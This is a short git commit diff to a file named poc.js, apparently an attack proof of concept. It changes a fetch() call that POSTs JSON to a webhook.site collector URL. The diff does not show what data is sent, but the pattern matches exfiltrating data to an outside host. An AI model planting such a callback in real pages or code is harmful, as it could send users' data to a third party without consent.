ca1d14d910c635baeb8ce8619b81f605664e58cc
RE <turbine@UnknownHardware.localdomain>
2023-02-07 17:44:31 -0500

    Initial Commit

--- poc.js
+++ poc.js
@@ -1,4 +1,4 @@
-fetch('https://webhook.site/#!/96cc3072-024a-489c-ada9-0d43689d3cc8', {
+fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json'
